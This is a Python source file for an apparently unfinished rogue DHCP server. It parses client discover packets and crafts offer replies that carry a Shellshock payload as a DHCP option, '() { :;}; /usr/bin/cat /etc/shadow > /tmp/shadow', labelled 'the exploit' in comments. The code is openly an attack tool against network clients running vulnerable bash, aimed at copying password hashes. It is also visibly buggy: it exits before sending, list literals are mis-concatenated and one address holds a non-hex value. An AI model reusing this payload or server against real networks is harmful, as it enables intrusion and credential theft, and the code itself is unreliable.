import socket
import select
from binascii import hexlify



class Listener:
    def __init__(self):
        self.client_list = []
        self.dhcpServer = DhcpServer()

        self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST,1)

        # self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # self.send_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    def start(self):

        self.dhcp_socket.bind(('', 67))
        # self.recv_socket.bind(('0.0.0.0', 67))
        # self.send_socket.bind(('0.0.0.0', 68))

        while True:
            # r, w, x = select.select([self.recv_socket, self.send_socket], [], [])
            r, w, x = select.select([self.dhcp_socket, self.dhcp_socket], [], [])
            for each in r:
                print('Recieved Something!')
                frame, void = each.recvfrom(10000)
                print(frame)
                frame = hexlify(frame)


                dhcp_message = [frame[i:i+2] for i in range(0, len(frame), 2)]
                print(dhcp_message)

                # ethernet_header, ip_header, udp_header, dhcp_message = self.clean_frame(frame)

                dhcpPacket = self.DhcpPacket(dhcp_message)

                # check client list
                if 'client' not in 'clien list':
                    client = Client(dhcpPacket)  # create client
                    self.client_list.append(client)
                    return_offer = dhcpPacket.craft_offer()
                    print('[+] Sending Offer')
                    print(return_offer)
                    exit()
                    self.dhcp_socket.send(return_offer)

                elif 'client' in 'requesting_client_list':
                    return_frame = self.craft_frame(ethernet_header, ip_header, udp_header, dhcpPacket.ack)
                    self.send_frame(return_frame)
                else:
                    pass

    # def clean_frame(self, frame):
    #     # CLEANING THE FRAME MAY NOT BE NECESARY
    #     frame = frame.split(b'\\x')
    #
    #     frame = [x for x in frame if x is not b'']
    #
    #     print(frame)
    #     print('\n')
    #     print(len(frame))
    #     ethernet_header, ip_header, udp_header, dhcp_discover = frame[0:14], frame[14:34], frame[34:42], frame[42:-1]
    #     return ethernet_header, ip_header, udp_header, dhcp_discover



    class DhcpPacket:
        def __init__(self, dhcp_message):
            print(dhcp_message)
            print(len(dhcp_message))
            self.exploit = hexlify(b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow")
            self.exploit = [self.exploit[i:i+2] for i in range(0, len(self.exploit),2)]
            print(self.exploit)
            self.exploit_len = len(self.exploit)
            self.exploit_len = b'%x' % self.exploit_len

            frame = dhcp_message

            # binary
            self.op = [frame[0]]  # REquest or reply
            print(self.op)
            self.htype = [frame[1]]  # Hardware address type
            print(self.htype)
            self.hlen = [frame[2]]  # Hardware length
            print(self.hlen)
            self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
            print(self.hops)
            self.xid = frame[4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
            print(self.xid)
            self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
            print(self.secs)
            self.flags = frame[10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
            print(self.flags)
            self.ciaddr = frame[12:16]  # client ip address
            print(self.ciaddr)
            self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
            print(self.yiaddr)
            self.siaddr = frame[20:24]  # Server ip address
            print(self.siaddr)
            self.giaddr = frame[24:28]  # first relay agent ip address
            print(self.giaddr)
            self.chaddr = frame[28:44]  # client hardware address
            print(self.chaddr)
            self.sname = frame[44:108]  # server host name
            print(len(self.sname))
            print(self.sname)
            self.file = frame[108:236]  # boot file name, routing information defined by server to the client // legacy
            print(len(self.file))
            print(self.file)
            self.magic_cookie = frame[236:240]
            print(self.magic_cookie)
            self.options = frame[240:]  # additional parameters

            print(self.options)

            self.options = self.breakup_options(self.options)

            self.offer = None
            self.ack = None


        def craft_offer(self):
            op = [b'02']  # REquest=ff or reply=00
            htype = [b'01']  # Hardware address type 01=ethernet
            hlen = [b'06']  # Hardware length
            hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
            xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
            secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
            flags = self.flags  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
            ciaddr = self.ciaddr  # client ip address
            yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
            siaddr = dhcpServer.server_ip  # Server ip address
            giaddr = self.giaddr  # first relay agent ip address
            chaddr = self.chaddr  # client hardware address
            sname = self.sname  # server host name
            file = self.file  # bootfile name, routing information defined by server to the client



            # options = frame[237:]  # additional parameters

            options = [b'53', b'01', b'02'  # DHCP, len, Offer
                       b'01', b'04', b'ff', b'ff', b'ff', b'00',  # subnetmask flag on, len=4, subnetmask
                       ## NEED A RENEWL TIME VALUE FLAG HERE
                       ## NEED A REBINDING TIME VALUE FLAG HERE
                       b'33', b'04', b'00', b'00', b'0e', b'10',  # lease time
                       b'36', b'04', b'c0', b'a8',
                       b'00', b'01',  # DHCP server identifier
                       # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                       b'72', self.exploit_len, self.exploit,
                       # NEED DHCP SERVER FLAG HERE
                       b'ff',  # end flag
                       # NEED PADDING HERE FOR UNUSED FLAGS
                       ]

            options_padding = [[b'00']*7,[b'0a']]
            options = [item for sublist in options for item in sublist]
            options_padding = [item for sublist in options_padding for item in sublist]
            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname, file, options, options_padding]
            print(return_packet)


            return_packet = [item for sublist in return_packet for item in sublist]
            print(return_packet)
            return (return_packet)

        def craft_ack(self):

            # binary
            self.op = [b'02']  # REquest or reply
            self.htype = [b'01']  # Hardware address type
            self.hlen = [b'06']  # Hardware length
            self.hops = [self.hops]  # hops; number of relay agents the message travels through, each one will add one
            self.xid = [
                self.xid]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
            self.secs = [b'00', b'00']  # number of seconds elapsed since clent sent a dhcp request
            self.flags = [b'00',
                          b'00']  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
            self.ciaddr = [b'00', b'00', b'00', b'00']  # client ip address
            self.yiaddr = [self.yiaddr]  # 'your' ip address, as assigned by server
            self.siaddr = [self.siaddr]  # Server ip address
            self.giaddr = [b'00', b'00', b'00', b'00']  # first relay agent ip address
            self.chaddr = [self.chaddr]  # client hhardware address
            self.sname = [self.sname]  # server host name
            self.file = [self.file]  # bootfile name, routing information defined by server to the client
            options = [b'53', b'01', b'02'  # DHCP, len, Offer
                        b'01', b'04', b'ff', b'ff', b'ff', b'00'  # subnetmask flag on, len=4, subnetmask
                        ## NEED A RENEWL TIME VALUE FLAG HERE
                        ## NEED A REBINDING TIME VALUE FLAG HERE
                        b'33', b'04', b'00', b'00', b'0e', b'10'  # lease time
                        b'36', b'04', b'c0', b'a8',
                        b'00',
                        b'01'  # DHCP server identifier
                        # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                        b'72', self.exploit_len, self.exploit,
                        # NEED DHCP SERVER FLAG HERE
                        b'ff'  # end flag
                        # NEED PADDING HERE FOR UNUSED FLAGS
                        ]

        def breakup_options(self, option_string):
            print('[+] breaking up options')
            cur = 0
            option_string = [x for x in option_string]
            print(option_string)
            options = []
            while True:
                # try:
                flag = option_string[cur]
                print('[Flag] %s' % str(flag))
                if flag == b'ff':
                    break
                cur += 1
                length = option_string[cur]
                print('[Length] %s' % str(length))
                cur += 1
                # TURN LENGTH INTO AN INT
                values = option_string[cur:int(length, 16) + cur]
                print('[Values] %s' % str(values))
                cur += int(length, 16)

                option = self.Option(flag, length, values)
                options.append(option)

                # except:
                #     # print('Error with options breakup')
                #     pass

            return options

        class Option:
            def __init__(self, flag, length, values):
                self.flag = flag
                self.length = length
                self.values = values

                print(flag, length, values)



class Client:
    def __init__(self, dhcpPacket):
        self.ip = dhcpPacket.ciaddr
        self.physical_address = dhcpPacket.chaddr


''' parts of code to be implented below'''


class DhcpServer:
    def __init__(self):
        self.server_ip = ['co','a8', '6e', '17']
        self.server_name = ['6c', '61', '70','70', '79']

        self.client_ip_available = [('c0', 'a8', '00', '01'),('c0', 'a8', '00', '02')]
        self.client_subnet = ['ff', 'ff', 'ff', '00']

    def get_next_ip(self):
        ip = self.client_ip_available.pop()
        return ip


class PacketFrameHex:
    def __init__(self, frame):
        self.frame = frame
        self.exploit = [(x) for x in b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow"]
        self.exploit_len = hex(len(self.exploit))

    def recieve_discovery(self):
        frame = self.frame
        # binary
        self.op = [frame[0]] # REquest or reply
        self.htype = [frame[1]] # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]] # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[4:8] # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10] # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[10:12] # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16] # client ip address
        self.yiaddr = frame[16:20] # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24] # Server ip address
        self.giaddr = frame[24:28] # first relay agent ip address
        self.chaddr = frame[29:45] # client hhardware address
        self.sname = frame[45:109] # server host name
        self.file = frame[109:237] #bootfile name, routing information defined by server to the client
        self.options = frame[227:] # additional parameters

    def craft_offer(self, dhcpServer):
        frame = self.frame
        op = ['02']  # REquest=ff or reply=00
        htype = ['01']  # Hardware address type 01=ethernet
        hlen = ['06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
        siaddr = dhcpServer.server_ip  # Server ip address
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        options = frame[237:]  # additional parameters

        options = ['53', '01', '02'  # DHCP, len, Offer
                   '01', '04' , 'ff', 'ff', 'ff', '00' # subnetmask flag on, len=4, subnetmask
                   ## NEED A RENEWL TIME VALUE FLAG HERE
                   ## NEED A REBINDING TIME VALUE FLAG HERE
                   '33', '04', '00', '00', '0e', '10' # lease time
                   '36', '04', 'c0', 'a8', '00', '01' # DHCP server identifier
                   # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   '72', self.exploit_len, self.exploit,
                   # NEED DHCP SERVER FLAG HERE
                   'ff' # end flag
                   # NEED PADDING HERE FOR UNUSED FLAGS
                   ]

    def recieve_request(self):
        frame = self.frame
        # binary
        self.op = [frame[0]]  # REquest or reply
        self.htype = [frame[1]]  # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[
                   4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[
                     10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16]  # client ip address
        self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24]  # Server ip address
        self.giaddr = frame[24:28]  # first relay agent ip address
        self.chaddr = frame[29:45]  # client hhardware address
        self.sname = frame[45:109]  # server host name
        self.file = frame[109:237]  # bootfile name, routing information defined by server to the client
        self.options = frame[227:]  # additional parameters

    def craft_ack(self):
        frame = self.frame
        # binary
        self.op = ['02']  # REquest or reply
        self.htype = ['01']  # Hardware address type
        self.hlen = ['06']  # Hardware length
        self.hops = [self.hops]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = [self.xid]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = ['00', '00']  # number of seconds elapsed since clent sent a dhcp request
        self.flags = ['00', '00']  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = ['00','00','00','00']  # client ip address
        self.yiaddr = [self.yiaddr]  # 'your' ip address, as assigned by server
        self.siaddr = [self.siaddr]  # Server ip address
        self.giaddr = ['00', '00', '00', '00']  # first relay agent ip address
        self.chaddr = [self.chaddr]  # client hhardware address
        self.sname = [self.sname]  # server host name
        self.file = [self.file]  # bootfile name, routing information defined by server to the client
        options = ['53', '01', '02'  # DHCP, len, Offer
                   '01', '04', 'ff', 'ff', 'ff', '00'  # subnetmask flag on, len=4, subnetmask
                   ## NEED A RENEWL TIME VALUE FLAG HERE
                   ## NEED A REBINDING TIME VALUE FLAG HERE
                   '33', '04', '00', '00', '0e', '10'  # lease time
                   '36', '04', 'c0', 'a8', '00',
                   '01'  # DHCP server identifier
                   # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   '72', self.exploit_len, self.exploit,
                   # NEED DHCP SERVER FLAG HERE
                   'ff'  # end flag
                   # NEED PADDING HERE FOR UNUSED FLAGS
                   ]
        return None





    def print_frame(self):
        print(
            len(self.op),
            len(self.htype),
            len(self.hlen),
            len(self.hops),
            len(self.xid),
            len(self.secs),
            len(self.flags) ,
            len(self.ciaddr) ,
            len(self.yiaddr) ,
            len(self.siaddr) ,
            len(self.giaddr) ,
            len(self.chaddr) ,
            len(self.sname) ,
            len(self.file) ,
            len(self.options))
        print(
            (self.op),
            (self.htype),
            (self.hlen),
            (self.hops),
            (self.xid),
            (self.secs),
            (self.flags),
            (self.ciaddr),
            (self.yiaddr),
            (self.siaddr),
            (self.giaddr),
            (self.chaddr),
            (self.sname),
            (self.file),
            (self.options))

def saver():
    return None



def main():
    global  dhcpServer
    dhcpServer = DhcpServer()

    listener = Listener()
    listener.start()

# UI
def main_main():
    dhcpServer = DhcpServer()
    client_list = []

    # a samoke dhcp_discover frame with ehternet header
    dhcp_discover = '''
\xff\xff\xff\xff\xff\xff\x00\x0b\x82\x01\xfc\x42\x08\x00\x45\x00
\x01\x2c\xa8\x36\x00\x00\xfa\x11\x17\x8b\x00\x00\x00\x00\xff\xff
\xff\xff\x00\x44\x00\x43\x01\x18\x59\x1f\x01\x01\x06\x00\x00\x00
\x3d\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x0b\x82\x01\xfc\x42\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x63\x82\x53\x63\x35\x01\x01\x3d\x07\x01
\x00\x0b\x82\x01\xfc\x42\x32\x04\x00\x00\x00\x00\x37\x04\x01\x03
\x06\x2a\xff\x00\x00\x00\x00\x00\x00\x00'''

    dhcp_discover.replace('\n', '')
    dhcp_discover = dhcp_discover.split(' ')
    dhcp_discover = [x for x in dhcp_discover if x is not '']

    ethernet_header, ip_header, udp_header, dhcp_discover = dhcp_discover[0:14], dhcp_discover[14:34], dhcp_discover[34:42], dhcp_discover[42:]

    packetFrameHex = PacketFrameHex(dhcp_discover)
    packetFrameHex.print_frame()
    packetFrameHex.craft_offer(dhcpServer)
    # listener()



if __name__ == '__main__':
    main()
